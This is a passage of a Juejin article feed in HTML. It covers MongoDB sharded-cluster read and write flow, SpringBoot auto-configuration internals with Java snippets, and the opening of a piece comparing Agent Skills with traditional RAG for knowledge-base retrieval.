<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4022f98efa504523a6f259a9315fcbad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=dFeBNHs8%2BYxfv5a%2B9bLLIxr5Zeg%3D" alt="分布式MongoDB集群" loading="lazy"/></p>
<p>分布式MongoDB集群</p>
<h3 data-id="heading-14">查询更新流程</h3>
<p>不管是读还是写，客户端应用都会连接到mongos，发起请求。</p>
<p>mongos 根据请求，基于缓存的分片信息，确定数据在哪个分片上。必要时向 Config Server 刷新分片信息。</p>
<p>再将请求，转发到对应的分片副本集，注意这里可能涉及多个分片。</p>
<p>在每个MongoDB分片内部，客户端请求先到达分片的server层，经过查询解析器解析查询语法、查询优化器选择索引生成执行计划，再给到执行器调用WiredTiger的函数接口。</p>
<ul>
<li>• 对于读操作，请求发送到WiredTiger存储引擎。WiredTiger先检查Cache中是否存在所需数据页，存在则直接返回。否则从磁盘读取数据页加载到cache中，再返回数据给mongos。mongos收集各分片的查询结果，进行合并、排序等处理，最终返回给客户端。</li>
<li>• 对于写操作，变更操作记录到Journal文件中，同时复制一份Cache的数据页，写入到复制页中。WiredTiger结合Checkpoint机制，将修改后的数据页写回磁盘。写操作完成后，分片主节点会将数据，实时同步给副本节点。当主节点和足够数量的副本节点都写入成功后，分片会返回写入确认给mongos。mongos收到所有相关分片的写入确认后，最终向客户端返回写操作成功的响应。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理]]></title>    <link>https://juejin.cn/post/7602161364892729344</link>    <guid>https://juejin.cn/post/7602161364892729344</guid>    <pubDate>2026-02-03T04:18:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602161364892729344" data-draft-id="7602161364892712960" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T04:18:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:18:49.000Z" title="Tue Feb 03 2026 04:18:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>SpringBoot的自动配置（Auto-configuration）是其最引人注目的特性之一，它极大地简化了Spring应用的开发流程。许多开发者享受着"开箱即用"的便利，却对其背后的实现机制知之甚少。本文将深入探讨SpringBoot自动配置的五个底层原理，揭示那些隐藏在<code>@EnableAutoConfiguration</code>注解背后的"黑魔法"。通过理解这些机制，你不仅能更好地驾驭SpringBoot，还能在遇到问题时快速定位根源。</p>
<hr/>
<h2 data-id="heading-2">主体内容</h2>
<h3 data-id="heading-3">1. 条件化Bean注册：<code>@Conditional</code>的进化史</h3>
<p>自动配置的核心在于<strong>按需加载</strong>，而这正是通过Spring 4.0引入的条件化机制实现的。</p>
<p><strong>深度解析：</strong></p>
<ul>
<li><code>@ConditionalOnClass</code>的实际工作原理：</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target({ElementType.TYPE, ElementType.METHOD})</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Conditional(OnClassCondition.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> ConditionalOnClass {
    Class&lt;?&gt;[] value() <span class="hljs-keyword">default</span> {};
    String[] name() <span class="hljs-keyword">default</span> {};
}
</code></pre>
<p>关键在于<code>OnClassCondition</code>这个实现类，它会在运行时通过<code>ClassNameFilter</code>检查类路径：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> ConditionOutcome[] getOutcomes(String[] autoConfigurationClasses,
        AutoConfigurationMetadata autoConfigurationMetadata) {
    ConditionOutcome[] outcomes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionOutcome</span>[autoConfigurationClasses.length];
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; outcomes.length; i++) {
        <span class="hljs-type">String</span> <span class="hljs-variable">autoConfigurationClass</span> <span class="hljs-operator">=</span> autoConfigurationClasses[i];
        <span class="hljs-keyword">if</span> (autoConfigurationClass != <span class="hljs-literal">null</span>) {
            outcomes[i] = getOutcome(autoConfigurationMetadata.get(autoConfigurationClass, <span class="hljs-string">"ConditionalOnClass"</span>));
        }
    }
    <span class="hljs-keyword">return</span> outcomes;
}
</code></pre>
<p><strong>进阶知识：</strong></p>
<ul>
<li>SpringBoot对条件注解做了性能优化：在应用启动时会将所有auto-configuration类的条件评估结果缓存起来</li>
<li><code>spring-autoconfigure-metadata.properties</code>文件的作用：提前存储条件判断所需元数据，避免反射开销</li>
</ul>
<h3 data-id="heading-4">2. 自动配置的加载机制：超越classpath扫描</h3>
<p>传统的Spring应用依赖组件扫描，而SpringBoot的自动配置采用了更高效的加载方式。</p>
<p><strong>关键流程：</strong></p>
<ol>
<li><code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code></li>
<li><code>spring.factories</code>中的淘汰机制（SpringBoot 2.7+已弃用）</li>
<li>导入处理器(<code>AutoConfigurationImportSelector</code>)的工作过程：</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> String[] selectImports(AnnotationMetadata annotationMetadata) {
    <span class="hljs-keyword">if</span> (!isEnabled(annotationMetadata)) {
        <span class="hljs-keyword">return</span> NO_IMPORTS;
    }
    <span class="hljs-type">AutoConfigurationEntry</span> <span class="hljs-variable">autoConfigurationEntry</span> <span class="hljs-operator">=</span> getAutoConfigurationEntry(annotationMetadata);
    <span class="hljs-keyword">return</span> StringUtils.toStringArray(autoConfigurationEntry.getConfigurations());
}
</code></pre>
<p><strong>性能优化点：</strong></p>
<ul>
<li>使用<code>AutoConfigurationSorter</code>对配置类进行拓扑排序</li>
<li><code>@AutoConfigureAfter</code>和<code>@AutoConfigureBefore</code>的实现原理</li>
<li>排除机制的双重保障：<code>exclude()</code>属性和条件评估</li>
</ul>
<h3 data-id="heading-5">3. 配置属性的绑定魔法：宽松绑定与类型安全</h3>
<p>从<code>application.properties/yaml</code>到<code>@Bean</code>属性的映射过程比表面看起来更复杂。</p>
<p><strong>类型转换体系：</strong></p>
<ol>
<li><code>Binder.bind()</code>方法的调用链</li>
<li><code>ConversionService</code>的特殊处理逻辑：</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> &lt;T&gt; Object <span class="hljs-title function_">convertValue</span><span class="hljs-params">(BindContext context, Object value, ResolvableType targetType)</span> {
    <span class="hljs-type">ConversionService</span> <span class="hljs-variable">conversionService</span> <span class="hljs-operator">=</span> context.getConversionService();
    <span class="hljs-keyword">if</span> (conversionService.canConvert(value.getClass(), targetType)) {
        <span class="hljs-keyword">return</span> conversionService.convert(value, targetType);
    }
    <span class="hljs-keyword">return</span> value;
}
</code></pre>
<p><strong>高级特性：</strong></p>
<ul>
<li>List/Map的特殊处理规则</li>
<li>Duration等时间类型的智能解析</li>
<li><code>@ConstructorBinding</code>与不可变类的配合使用</li>
<li>Relaxed Binding的实现细节（如将`socket-timeout映射为socketTimeout）</li>
</ul>
<h3 data-id="heading-6">4. SPI扩展点设计："约定优于配置"的工程实践</h3>
<p>SpringBoot大量使用了Java SPI机制来实现可扩展性。</p>
<p><strong>核心扩展接口一览表：</strong></p>

























<table><thead><tr><th>接口</th><th>用途</th><th>典型实现</th></tr></thead><tbody><tr><td><code>ApplicationContextInitializer</code></td><td>上下文初始化</td><td><code>ConditionEvaluationReportLoggingListener</code></td></tr><tr><td><code>ApplicationListener&lt;E&gt;</code></td><td>事件监听</td><td><code>BackgroundPreinitializer</code>, <code>EnvironmentPostProcessorApplicationListener</code></td></tr><tr><td><code>EnvironmentPostProcessor</code></td><td>Environment定制</td><td><code>CloudFoundryVcapEnvironmentPostProcessor</code></td></tr></tbody></table>
<p><strong>自定义扩展实战：</strong>
如何编写自己的自动配置模块：</p>
<ol>
<li>创建/META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports文件</li>
<li>实现典型的条件注解组合：</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@AutoConfigureAfter({DataSourceAutoConfiguration.class})</span>
<span class="hljs-meta">@ConditionalOnClass({JdbcTemplate.class, DataSource.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCustomAutoConfig</span> {

    <span class="hljs-meta">@Bean</span> 
    <span class="hljs-meta">@ConditionalOnMissingBean</span> 
    <span class="hljs-keyword">public</span> MyCustomComponent <span class="hljs-title function_">myComponent</span><span class="hljs-params">()</span> {...}
}
</code></pre>
<p>###5. Bean后处理的艺术:`BeanPostProcessor'的高级玩法</p>
<p>自动配置中大量使用了Bean后置处理器来实现动态行为。</p>
<p>典型案例分析:
1. ConfigurationPropertiesBindingPostProcessor的属性绑定流程
2. WebServerFactoryCustomizerBeanPostProcessor对嵌入式容器的定制</p>
<p>核心代码片段:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span> 
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessBeforeInitialization</span><span class="hljs-params">(Object bean,String beanName)</span>{
<span class="hljs-keyword">if</span>(bean <span class="hljs-keyword">instanceof</span> WebServerFactory webServerFactory){
postProcessWebServerFactory(webServerFactory);}<span class="hljs-keyword">return</span> bean;}
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postProcessWebServerFactory</span><span class="hljs-params">(...)</span>{
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> customizer:customizers){customizer.customize(factory);}}
</code></pre>
<p>隐藏技巧:
• SmartInitializingSingleton的特殊作用时机
• ImportAware与注入元数据的巧妙结合
• BeanDefinitionRegistryPostProcessor在自动配置中的关键应用</p>
<hr/>
<p>##总结</p>
<p>通过对这五个底层原理的深入剖析我们可以发现 SpringBoot的自动配置绝非简单的"约定优于配詈"。其背后融合了:</p>
<p>1.精细的条件判断系统<br/>
2.高效的资源配置加载机制<br/>
3．强大的属性转换体系<br/>
4．可扩展的SPI架构设计<br/>
5．灵活的Bean生命周期控制</p>
<p>理解这些黑魔法不仅能让我们更好地解决实际开发中遇到的问题更能启发我们设计出更加优雅的系统架构。下次当你的应用神奇地"just work"时不妨思考一下背后这些精妙的工程设计。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 Agent Skills 做知识库检索，能比传统 RAG 效果更优吗？]]></title>    <link>https://juejin.cn/post/7602252722373279795</link>    <guid>https://juejin.cn/post/7602252722373279795</guid>    <pubDate>2026-02-03T04:47:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602252722373279795" data-draft-id="7602206323460440115" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 Agent Skills 做知识库检索，能比传统 RAG 效果更优吗？"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T04:47:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 Agent Skills 做知识库检索，能比传统 RAG 效果更优吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:47:53.000Z" title="Tue Feb 03 2026 04:47:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本期视频教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RkFAznESD%2F" target="_blank" title="https://www.bilibili.com/video/BV1RkFAznESD/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Rk…</a></p>
</blockquote>
<p>使用 Agent Skills 做知识库检索，是一种什么体验？</p>
<p>它能比传统的分块+向量匹配的 RAG 效果更好吗？</p>
<p>大家好，欢迎来到 code秘密花园，我是花园老师，这一期我们进入 Agent Skills 的实战章节。</p>
<h2 data-id="heading-0">基础回顾</h2>
<p>我们上期视频介绍了 Skills 的工作原理和使用方法，我们简单回顾一下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d38d684a449143d0819b76a8a622e543~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=JfJ0ijf8UnqwYkxvG%2BBG2zPVsdE%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>Skills 是最近 Anthropic 推出的一个 Agent 领域的行业标准，它本身就是一个文件夹，里面存放着具体的使用说明（SKILL.md），更详细的参考文档（reference），以及可执行脚本（script）。</p>
</blockquote>
<p>它的核心特性就是渐进式加载策略：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3b823eebd564278892f1d241ba2e7e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=nTPEElLoLptozv8ZgpFb9n7NL84%3D" alt="" loading="lazy"/></p>
<ul>
<li>在 Agent 启动时，仅将所有 Skills 的基本描述加入 AI 的上下文</li>
<li>当用户发出需求时，AI 会根据 Skill 的描述判断具体要调用哪个 Skill</li>
<li>决定后再去读取这个 Skill 的使用说明（SKILL.md）</li>
<li>然后再根据使用说明进一步读取更详细的参考文档，以及决定是否执行某个脚本来连接外部世界</li>
</ul>
<p>通过这样的模式，可以让 Agent 既能节省大量的上下文，又能够精准响应用户需求找到并执行某个技能。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c790c943a22445b0a5d48861467ed681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=SZI0rVcGMYo7%2BGO%2Bc3T%2Fmhyanb8%3D" alt="" loading="lazy"/></p>
<p>Skills 的使用也非常简单，你只需要把它的文件夹放到特定 Agent 的目录下（如 .claude/skills），AI 就会在下次启动时识别到这个 Skill，并根据用户需求判断是否调用。</p>
<p>下面，我们来实战探索一下，Skill 有哪些有意思的玩法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc33f13fdaab4e45b8b3ceccbcaf5015~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=6r6SR7kGbYgXAS9NQYDAP5vqfGI%3D" alt="" loading="lazy"/></p>
<p>熟悉我的粉丝都知道，我本人对传统的通过 Chunk + Embedding 这种实现 RAG 的模式有比较大的偏见。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a509df7b1d6940bd9024dc7cc72926d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=DCWLIB7vTlRBkF3Iv2530F0tV3o%3D" alt="" loading="lazy"/></p>
<p>虽然这种模式最终也能调教出比较好的结果，但调优过程实在是太痛苦了，我是真正经历过毒打的才会有这种感觉。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/900867ce1b744c52a16bab6844d044ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=ge2mdvdNgrfAZQAdhL7IpHG3HJg%3D" alt="" loading="lazy"/></p>
<p>相信很多同学也感同身受，所以我一直感觉这种方案只是当下的一种妥协模式，终究会被时代淘汰的。</p>
<p>最近 LlamaIndex 创始人 Jerry Liu 发表的 Twitter 刚好比较符合我的观点：</p>
